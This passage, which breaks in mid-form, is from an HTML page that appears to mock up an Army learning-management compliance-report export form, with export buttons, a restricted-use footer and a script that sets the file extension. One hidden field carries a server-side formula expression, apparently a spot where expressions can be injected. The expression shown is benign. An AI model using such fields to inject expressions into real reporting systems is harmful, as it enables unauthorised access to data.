        <input type="hidden" name="rdShowModes"         value="=IIF(Left(&quot;agContentAccess&quot;,2) = &quot;ag&quot;, &quot;rdAgTable&quot;, )">
        <input type="hidden" name="rdAgDataColumnDetails" value="%2CLAST_NAME%3BLast+Name%3AText%2CFIRST_NAME%3BFirst+Name%3AText%2CCOURSE_NAME%3BContent+Title%3AText">
        <button type="submit" class="btn btn-gold">
          <svg viewBox="0 0 24 24"><path d="M4 16v1a3 3 0 003 3h10a3 3 0 003-3v-1m-4-4l-4 4m0 0l-4-4m4 4V4"/></svg>
          Export to Excel
        </button>
      </form>
      <button class="btn btn-ghost btn-sm" disabled>
        <svg viewBox="0 0 24 24"><path d="M17 17H17.01M17 3H5a2 2 0 00-2 2v4a2 2 0 002 2h14a2 2 0 002-2V5a2 2 0 00-2-2zM3 15h18M3 19h18"/></svg>
        Print
      </button>
      <button class="btn btn-ghost btn-sm" disabled>
        <svg viewBox="0 0 24 24"><path d="M3 8l7.89 5.26a2 2 0 002.22 0L21 8M5 19h14a2 2 0 002-2V7a2 2 0 00-2-2H5a2 2 0 00-2 2v10a2 2 0 002 2z"/></svg>
        Email
      </button>
      <span style="margin-left:auto;font-size:.72rem;color:#7A8FA8;">Report generated: Jan 6, 2021 4:18 PM</span>
    </div>

  </main>
</div>

<footer>
  <span>Army Learning Management System &copy; 2021 &middot; <a href="#">Help</a> &middot; <a href="#">Privacy Policy</a> &middot; <a href="#">Contact Support</a></span>
  <span>UNCLASSIFIED // FOR OFFICIAL USE ONLY</span>
</footer>
<script>
// Sync format select → hidden rdExportFilename extension
document.getElementById('fmtSel').addEventListener('change', function() {
  var map = {'NativeExcel': '.xlsx', 'CSV': '.csv', 'PDF': '.pdf'};
  var fn  = document.querySelector('[name="rdExportFilename"]');
  fn.value = 'compliance-report-2021-01-06' + (map[this.value] || '.xlsx');
});
</script>
</body>
</html>
